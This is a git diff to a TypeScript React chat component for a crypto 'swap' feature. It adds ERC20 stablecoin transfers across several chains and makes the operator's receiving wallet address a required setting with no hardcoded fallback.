@@ -261,33 +261,112 @@ export default function Chat() {
 
     try {
       const signer = await provider.getSigner();
-      const ownerAddress = import.meta.env.VITE_OWNER_WALLET_ADDRESS || "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb1";
+      const ownerAddress = import.meta.env.VITE_OWNER_WALLET_ADDRESS;
 
-      // Prepare transaction based on token type
-      let txParams;
-      
-      if (swapData.token === "ETH" || swapData.token === "BNB" || swapData.token === "MATIC") {
-        // Native token transfer
-        txParams = {
-          to: ownerAddress,
-          value: ethers.parseEther(swapData.amount),
-        };
-      } else {
-        // ERC20 token transfer (USDT, USDC, DAI, BUSD)
-        toast({
-          title: "ERC20 Transfer",
-          description: "ERC20 token transfers will be implemented in the next phase",
-        });
-        return;
+      if (!ownerAddress) {
+        throw new Error("Owner wallet address not configured. Please contact support.");
       }
 
-      toast({
-        title: "Sign Transaction",
-        description: "Please approve the transaction in your wallet",
-      });
+      // ERC20 token addresses for different blockchains
+      const tokenAddresses: Record<string, Record<string, string>> = {
+        ethereum: {
+          USDT: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+          USDC: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+          DAI: "0x6B175474E89094C44Da98b954EedeAC495271d0F",
+        },
+        bsc: {
+          USDT: "0x55d398326f99059fF775485246999027B3197955",
+          USDC: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
+          BUSD: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",
+        },
+        polygon: {
+          USDT: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
+          USDC: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
+          DAI: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063",
+        },
+        arbitrum: {
+          USDT: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
+          USDC: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831",
+          DAI: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1",
+        },
+        base: {
+          USDC: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
+          DAI: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb",
+        },
+      };
+
+      // ERC20 ABI (minimal for transfer)
+      const erc20Abi = [
+        "function transfer(address to, uint256 amount) returns (bool)"
+      ];
+
+      let tx;
+
+      if (swapData.token === "ETH" || swapData.token === "BNB" || swapData.token === "MATIC") {
+        // Native token transfer
+        toast({
+          title: "Sign Transaction",
+          description: "Please approve the transaction in your wallet",
+        });
+
+        tx = await signer.sendTransaction({
+          to: ownerAddress,
+          value: ethers.parseEther(swapData.amount),
+        });
+      } else {
+        // ERC20 token transfer
+        const blockchain = swapData.blockchain.toLowerCase();
+        const tokenAddress = tokenAddresses[blockchain]?.[swapData.token];
+
+        if (!tokenAddress) {
+          throw new Error(`Token ${swapData.token} not supported on ${swapData.blockchain}`);
+        }
+
+        // Token decimals per chain (important: BSC uses 18 decimals for all!)
+        const tokenDecimals: Record<string, Record<string, number>> = {
+          ethereum: {
+            USDT: 6,
+            USDC: 6,
+            DAI: 18,
+          },
+          bsc: {
+            USDT: 18,
+            USDC: 18,
+            BUSD: 18,
+          },
+          polygon: {
+            USDT: 6,
+            USDC: 6,
+            DAI: 18,
+          },
+          arbitrum: {
+            USDT: 6,
+            USDC: 6,
+            DAI: 18,
+          },
+          base: {
+            USDC: 6,
+            DAI: 18,
+          },
+        };
+
+        const decimals = tokenDecimals[blockchain]?.[swapData.token];
+        if (!decimals) {
+          throw new Error(`Unknown decimals for ${swapData.token} on ${swapData.blockchain}`);
+        }
+
+        toast({
+          title: "Sign Transaction",
+          description: "Please approve the ERC20 transfer in your wallet",
+        });
+
+        const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, signer);
+        const amount = ethers.parseUnits(swapData.amount, decimals);
+
+        tx = await tokenContract.transfer(ownerAddress, amount);
+      }
 
       // Request signature and send transaction
-      const tx = await signer.sendTransaction(txParams);
 
       const processingMsg: Message = {
         id: Date.now().toString(),
